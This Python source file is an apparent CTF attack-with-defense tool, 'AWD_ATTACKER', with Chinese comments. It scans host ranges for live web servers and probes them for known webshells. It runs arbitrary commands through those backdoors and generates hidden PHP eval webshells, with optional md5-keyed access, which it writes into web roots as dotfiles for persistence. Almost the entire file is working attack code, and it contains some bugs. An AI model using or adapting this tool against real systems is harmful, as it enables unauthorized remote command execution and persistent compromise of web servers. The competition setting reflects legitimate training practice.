import paramiko
import sys
import random
import os
import socket
import string
import random
import requests
import threading
import hashlib
from termcolor import colored
from urllib.parse import urlparse
title=r'''
**********************************************************************************************************************
 $$$$$$\  $$\      $$\ $$$$$$$\         $$$$$$\ $$$$$$$$\ $$$$$$$$\  $$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$  __$$\ $$ | $\  $$ |$$  __$$\       $$  __$$\\__$$  __|\__$$  __|$$  __$$\ $$  __$$\ $$ | $$  |$$  _____|$$  __$$\ 
$$ /  $$ |$$ |$$$\ $$ |$$ |  $$ |      $$ /  $$ |  $$ |      $$ |   $$ /  $$ |$$ /  \__|$$ |$$  / $$ |      $$ |  $$ |
$$$$$$$$ |$$ $$ $$\$$ |$$ |  $$ |      $$$$$$$$ |  $$ |      $$ |   $$$$$$$$ |$$ |      $$$$$  /  $$$$$\    $$$$$$$  |
$$  __$$ |$$$$  _$$$$ |$$ |  $$ |      $$  __$$ |  $$ |      $$ |   $$  __$$ |$$ |      $$  $$<   $$  __|   $$  __$$< 
$$ |  $$ |$$$  / \$$$ |$$ |  $$ |      $$ |  $$ |  $$ |      $$ |   $$ |  $$ |$$ |  $$\ $$ |\$$\  $$ |      $$ |  $$ |
$$ |  $$ |$$  /   \$$ |$$$$$$$  |      $$ |  $$ |  $$ |      $$ |   $$ |  $$ |\$$$$$$  |$$ | \$$\ $$$$$$$$\ $$ |  $$ |
\__|  \__|\__/     \__|\_______/$$$$$$\\__|  \__|  \__|      \__|   \__|  \__| \______/ \__|  \__|\________|\__|  \__|
                                \______|                                                                              
                                       v1.5 by AsaL1n                                           
**********************************************************************************************************************
'''
class shell():
   #构造一个shell的集合 包括编号等 默认初始shell为0
   def __init__(self,number,url,key_method,key,key_value,cmd,cmd_method,payload):
      self.number=number  # shell的对应编号
      self.url=[] #列表
      self.key_method=key_method # 密钥传递方法
      self.key=key # 密钥名字
      self.key_value=key_value # 密钥值 
      self.cmd=cmd # 执行的命令
      self.cmd_method=cmd_method # 命令执行参数传递返回方式
      self.payload=payload #命令执行参数 
def scan():
   #探活 同时写入文件 写入active_url 中
   output_file="output.txt"
   url=input("输入网址格式 如 http://192-168-1-?.awd.example-ctf.com/ 输出探活结果 并且写入文件中\n")
   if "?" not in url:
      print("格式错误")
      return
   def scan_try(aimurl, i):
    global active_url, lock
    try:
        r = requests.get(aimurl, timeout=5,allow_redirects=False)
        if r.status_code == 200:
            lock.acquire()
            active_url.append(aimurl)
            lock.release()
    except:
        pass
   scaner_threads = []
   for i in range(256):
     aimurl=str(url).replace("?",str(i))
     new_thread = threading.Thread(target=scan_try, args=(aimurl, i,))
     scaner_threads.append(new_thread)
     new_thread.start()
   for i in scaner_threads:
     i.join()
   with open(output_file, 'w') as f:
      for url in active_url:
         f.write(url + '\n')
def read():
   # 读取文件内的url 写入active_url
   output_file="output.txt"
   with open(output_file, 'r') as f:
      for url in f:
         active_url.append(url.strip())
         print("[*]已经读取到"+url.strip())
def check_backdoor():
   if len(active_url)==0:
      print("未加载存活主机")
      return
   path=input("输入已知shell路径 如 public/img/1.php  开头不要存在/ \n")
   print("正在检测是否存在后门")   
   for url in active_url:
      try:
         rsp=requests.get(url+path,timeout=5,allow_redirects=False)
         if rsp.status_code==200:
            backdoor.append(url+path)
            print(colored("[+] 发现疑似存在的后门！"+url+path,'light_red'))
      except:
         pass
   if len(backdoor)==0:
      print(colored("[+] 未发现疑似存在的后门！","light_red"))
      return
   key_method=input("输入后门的key传递方式  1:GET 2:POST 为空则默认无key :\n")
   if(key_method==""):#不存在key的情况
      key_method="0"
      key="0"
      key_value="0"
   else:   
      key=input("输入后门的密钥参数:\n")
      key_value=input("输入后门的参数值:\n")
   cmd_method=input("输入后门的命令执行方式  1:GET 2:POST 为空默认为post:\n")
   if cmd_method=="":
      cmd_method="2"
   payload=input("输入后门的命令参数")
   cmd=""
   new_shell=shell(number,url,key_method,key,key_value,cmd,cmd_method,payload)
   for url in backdoor:
      new_shell.url.append(url)
   print(colored("[+] 已添加入已知后门:"+new_shell.number,'light_red'))
   number+=1
def check_own_shell():
   if know_shell==[]:
      print("未存在已知后门")
      return
   for shell in know_shell:
      print(colored("[+] :已知存在后门"+shell.number,'light_red'))
def run_shell():
   #查找存在的后门 执行命令
   if len(know_shell)==0:
      print("未存在已知后门")
      return
   choose=int(input("输入需要使用的的后门编号:\n"))
   for i in range(len(know_shell)):
      if(i==choose):
         choose_shell=know_shell[i]
      else:
         print("不存在这个后门")
         return
   cmd=input("输入需要执行的命令:\n")
   for url in choose_shell.url:
      get_post(url,choose_shell.key_method,choose_shell.key,choose_shell.key_value,cmd,choose_shell.cmd_method,choose_shell.payload)
def get_post(url,key_method,key,key_value,cmd,cmd_method,payload):
   if(key_method=="1"):#get传递key
      if(cmd_method=="1"):
         rsp=requests.get(url+"?"+key+"="+key_value+"&"+payload+"="+cmd)
         if(rsp.status_code==200):
            print("[+] 命令执行成功:"+rsp.text)
         else:
            print("[X] 命令执行失败")
      elif(cmd_method=="2"):
         rsp=requests.post(url+"?"+key+"="+key_value,data={payload:cmd})
         if(rsp.status_code==200):
            print("[+] 命令执行成功:"+rsp.text)
         else:
            print("[X] 命令执行失败")
   if(key_method=="2"):#post传递key
      if(cmd_method=="1"):
         rsp=requests.get(url="?"+payload+"="+cmd,data={key:key_value})
         if(rsp.status_code==200):
            print("[+] 命令执行成功:"+rsp.text)
         else:
            print("[X] 命令执行失败")
      elif(cmd_method=="2"):
         rsp=requests.post(url,data={key:key_value,payload:cmd})
         if(rsp.status_code==200):
            print("[+] 命令执行成功:"+rsp.text)
         else:
            print("[X] 命令执行失败")
   if(key_method=="0"):#不存在密钥
      if(cmd_method=="1"):
         rsp=requests.get(url="?"+payload+"="+cmd)
         if(rsp.status_code==200):
            print("[+] 命令执行成功:"+rsp.text)
         else:
            print("[X] 命令执行失败")
      elif(cmd_method=="2"):
         rsp=requests.post(url,data={payload:cmd})
         if(rsp.status_code==200):
            print("[+] 命令执行成功:"+rsp.text)
         else:
            print("[X] 命令执行失败")
def make_shell():
   # 生成随机隐藏后门 在成功检测到存在后门的时候进一步伪装 构造新的小马 默认写入根目录下
   length=5
   letters_and_digits = string.ascii_letters + string.digits
   file=''.join(random.choice(letters_and_digits) for _ in range(length))
   payload=''.join(random.choice(letters_and_digits) for _ in range(length))
   new_backdoor="<?eval($_POST['{0}']);".format(payload)
   path=input("输入写入路径 默认为/var/www/html/")
   if(path==""):
      path="/var/www/html/"
   filename=path+"."+file+".php"
   cmd="system(\"echo '{0}' > {1}\")".format(new_backdoor,filename)
   return cmd,filename,payload
def make_key_shell():
   # 生成随机隐藏后门 在成功检测到存在后门的时候进一步伪装 构造新的key小马 默认写入根目录下 
   length=5
   letters_and_digits = string.ascii_letters + string.digits
   file=''.join(random.choice(letters_and_digits) for _ in range(length))
   payload=''.join(random.choice(letters_and_digits) for _ in range(length))
   key=''.join(random.choice(letters_and_digits) for _ in range(length))
   md5_key=hashlib.md5(key.encode()).hexdigest()

   new_backdoor="<?php if(md5($_POST['{0}'])==='{1}'){eval($_POST['{2}']);}".format(key,md5_key,payload)
   path=input("输入写入路径 默认为/var/www/html/")
   if(path==""):
      path="/var/www/html/"
   filename=path+"."+file+".php"
   cmd="system(\"echo '{0}' > {1}\")".format(new_backdoor,filename)
   return cmd,filename,key,md5_key,payload
def update_shell():
   if know_shell==[]:
      print("未存在已知后门")
      return
   input=int(input("输入需要使用的后门\n"))
   for shell in know_shell:
       if(shell.number==input):
          choose_shell=shell
          break
   else:
       print("未找到选择的后门")   
       return
   shell=input("输入需要生成的马 1.不带key的隐藏马 2. 带key的隐藏马\n")
   if(shell=="1"):
      cmd,filename,payload=make_shell() 
      tips=0
      for url in choose_shell.url:
         parsed_url = urlparse(url)
         test_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
         get_post(test_url,choose_shell.key_method,choose_shell.key,choose_shell.key_value,cmd,choose_shell.cmd_method,payload)
         if tips==0:
           newshell=shell(number,test_url+filename,"0","0","0","",choose_shell.cmd_method,payload)
           tips+=1
         else:
           newshell.url.append(test_url+filename)
      print(colored("[+] 已添加新的后门 编号:"+newshell.number,'light_red'))
      newshell.number+=1
   elif(shell=="2"):
      cmd,filename,key,key_value,payload=make_key_shell() 
      tips=0
      for url in choose_shell.url:
         parsed_url = urlparse(url)
         test_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
         get_post(test_url,choose_shell.key_method,choose_shell.key,choose_shell.key_value,cmd,choose_shell.cmd_method,payload)
      if tips==0:
           newshell=shell(number,test_url+filename,"2",key,key_value,"","2",payload)
           tips+=1
      else:
           newshell.url.append(test_url+filename)
      print(colored("[+] 已添加新的后门 编号:"+newshell.number,'light_red'))
      newshell.number+=1
def end_exit():
    sys.exit()
def help():
   print(colored(title,'light_red'))
   url='''
   输入对应编号执行对应操作
   [*]1 快速探活并且写入文件
   [*]2 从文件中读入存活ip
   [*]3 检测存活ip是否存在已知后门
   [*]4 检测程序中储存的已知后门
   [*]5 指定已知后门 执行命令
   [*]6 生成新的后门 上传
   [*]7 退出程序
   [*]8 帮助
   '''
   print(colored(url,'light_blue'))
def menu():
  help()
  while True:
   choose=input("请输入需要执行的操作\n")
   if(choose=="1"):
      scan()
   elif(choose=="2"):
      read()
   elif(choose=="3"):
      check_backdoor()
   elif(choose=="4"):
      check_own_shell()
   elif(choose=="5"):
      run_shell()
   elif(choose=="6"):
      update_shell() 
   elif(choose=="7"):
      end_exit()
   elif(choose=="8"):
      help()
   else:
      print("不存在这样的比赛")

def main():
   global active_url,backdoor,know_shell,number
   number=0
   know_shell=[] #已知的shell后门集合
   backdoor=[] # 已知的后门路由
   active_url=[]# 存活ip
   menu()
   

if __name__ == '__main__': 
   # print(colored(title,'light_red'))
   lock = threading.Lock()
   main()
